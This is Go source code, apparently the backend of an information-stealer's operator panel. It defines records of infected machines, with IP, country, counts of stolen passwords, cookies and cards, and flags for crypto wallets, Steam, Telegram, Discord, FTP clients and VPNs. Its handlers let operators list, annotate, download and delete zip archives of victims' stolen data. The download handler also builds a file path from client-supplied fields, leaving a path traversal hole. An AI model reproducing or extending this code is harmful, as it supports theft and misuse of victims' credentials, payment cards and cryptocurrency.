package logs

import (
	"net/http"
	"os"
	"path/filepath"

	database "../../db"
	lggr "../../logger"
	domaind "../domaind"
	login "../login"

	"github.com/gin-gonic/gin"
)

var db = database.Connect()
var logger = lggr.Log()

type LogsData struct {
	Id              int              `db:"Id" json:"id"`
	ForUsers        string           `db:"ForUsers" json:"for_users"`
	Uid             string           `db:"Uid" json:"uid"`
	Checked         bool             `db:"Checked" json:"checked"`
	Prefix          string           `db:"Prefix" json:"prefix"`
	WinVer          string           `db:"WinVer" json:"win_ver"`
	Date            int64            `db:"Date" json:"date"`
	Ip              string           `db:"Ip" json:"ip"`
	Country         string           `db:"Country" json:"country"`
	Passwords       int              `db:"Passwords" json:"passwords"`
	Cookies         int              `db:"Cookies" json:"cookies"`
	Cards           int              `db:"Cards" json:"card"`
	Forms           int              `db:"Forms" json:"forms"`
	Domains         string           `db:"Domains" json:"domains"`
	DetectedDomains []domaind.DdData `json:"detected_domains"`
	Comment         string           `db:"Comment" json:"comment"`
	Chromium        bool             `db:"Chromium" json:"chromium"`
	Gecko           bool             `db:"Gecko" json:"gecko"`
	Edge            bool             `db:"Edge" json:"edge"`
	Electrum        bool             `db:"Electrum" json:"electrum"`
	MultiBit        bool             `db:"MultiBit" json:"multi_bit"`
	Armory          bool             `db:"Armory" json:"armory"`
	Ethereum        bool             `db:"Ethereum" json:"ethereum"`
	Bytecoin        bool             `db:"Bytecoin" json:"bytecoin"`
	Jaxx            bool             `db:"Jaxx" json:"jaxx"`
	LibertyJaxx     bool             `db:"LibertyJaxx" json:"liberty_jaxx"`
	Atomic          bool             `db:"Atomic" json:"atomic"`
	Exodus          bool             `db:"Exodus" json:"exodus"`
	DashCore        bool             `db:"DashCore" json:"dash_core"`
	Bitcoin         bool             `db:"Bitcoin" json:"bitcoin"`
	Wasabi          bool             `db:"Wasabi" json:"wasabi"`
	Daedalus        bool             `db:"Daedalus" json:"daedalus"`
	Monero          bool             `db:"Monero" json:"monero"`
	Steam           bool             `db:"Steam" json:"steam"`
	Telegram        bool             `db:"Telegram" json:"telegram"`
	Discord         bool             `db:"Discord" json:"discord"`
	Pidgin          bool             `db:"Pidgin" json:"pidgin"`
	Psi             bool             `db:"Psi" json:"psi"`
	PsiPlus         bool             `db:"PsiPlus" json:"psi_plus"`
	Foxmail         bool             `db:"Foxmail" json:"foxmail"`
	Outlook         bool             `db:"Outlook" json:"outlook"`
	FileZilla       bool             `db:"FileZilla" json:"file_zilla"`
	WinScp          bool             `db:"WinScp" json:"win_scp"`
	Authy           bool             `db:"Authy" json:"authy"`
	NordVpn         bool             `db:"NordVpn" json:"nord_vpn"`
}

func GetLog(id int) (logData LogsData) {
	err := db.Get(&logData, "SELECT * FROM `logs` WHERE `Id` = ?", id)
	if err != nil {
		logger.Println("logs.GetLog: get log from bd error: ", err)
	}
	return
}

func GetLogs(username string) (logsData []LogsData) {
	err := db.Select(&logsData, "SELECT * FROM `logs` WHERE `ForUsers` LIKE ? ORDER BY `Id` DESC", "%"+username+"%")
	if err != nil {
		logger.Println("logs.GetLogs: get logs from bd error: ", err)
	}
	return
}

func IsUserAccess(username, uid string) bool {
	userLogs := GetLogs(username)
	for _, log := range userLogs {
		if log.Uid == uid {
			return true
		}
	}
	return false
}

type LogForm struct {
	Cookie string   `json:"cookie"`
	Data   LogsData `json:"form"`
}

func GetLogsData(ctx *gin.Context) {
	var logForm LogForm
	ctx.BindJSON(&logForm)

	user := login.IsUserValid(logForm.Cookie)
	if user == "" {
		logger.Println("logs.GetLogsData: unauthorized user: ", ctx.ClientIP())
		return
	}

	logsData := GetLogs(user)

	if len(logsData) < 1 {
		ctx.JSON(http.StatusOK, "")
		return
	}
	SetDetectedDomains(logsData)
	ctx.JSON(http.StatusOK, logsData)
}

func LogComment(ctx *gin.Context) {
	var logForm LogForm
	ctx.BindJSON(&logForm)

	username := login.IsUserValid(logForm.Cookie)
	if username == "" {
		logger.Println("logs.LogComment: unauthorized user: ", ctx.ClientIP())
		return
	}

	if !IsUserAccess(username, logForm.Data.Uid) {
		return
	}

	_, err := db.Exec("UPDATE `logs` SET `Comment` = ? WHERE `Uid` = ?", logForm.Data.Comment, logForm.Data.Uid)
	statusErr := ""
	if err != nil {
		logger.Println("logs.LogComment: ", err)
		statusErr = err.Error()
	}

	ctx.JSON(http.StatusOK, gin.H{"err": statusErr})
}

func DownloadLog(ctx *gin.Context) {
	var logForm LogForm
	ctx.BindJSON(&logForm)

	username := login.IsUserValid(logForm.Cookie)
	if username == "" {
		logger.Println("logs.DownloadLog: unauthorized user: ", ctx.ClientIP())
		return
	}

	if !IsUserAccess(username, logForm.Data.Uid) {
		return
	}

	_, err := db.Exec("UPDATE `logs` SET `Checked` = 1 WHERE `Uid` = ?", logForm.Data.Uid)
	if err != nil {
		logger.Println("logs.DownloadLog: ", err)
	}

	filePath := filepath.Join("./logs/", logForm.Data.Country+"_"+logForm.Data.Uid+".zip")
	ctx.File(filePath)
}

func LogDelete(ctx *gin.Context) {
	var logForm LogForm
	ctx.BindJSON(&logForm)

	if !login.RootAuthCheck(logForm.Cookie) {
		ctx.JSON(http.StatusOK, gin.H{"err": "Not root user can not delete logs"})
		logger.Println("logs.LogDelete: unauthorized user: ", ctx.ClientIP())
		return
	}

	logData := GetLog(logForm.Data.Id)

	_, err := db.Exec("DELETE FROM `logs` WHERE `Id` = ?", logData.Id)
	if err != nil {
		logger.Println("logs.LogDelete: delete log from db error:", err)
	}

	filePath := filepath.Join("./logs", logData.Country+"_"+logData.Uid+".zip")
	err = os.Remove(filePath)
	if err != nil {
		logger.Println("logs.LogDelete: delete log from disk error:", err)
	}

	statusErr := ""
	if err != nil {
		statusErr = err.Error()
	}

	ctx.JSON(http.StatusOK, gin.H{"err": statusErr})
}
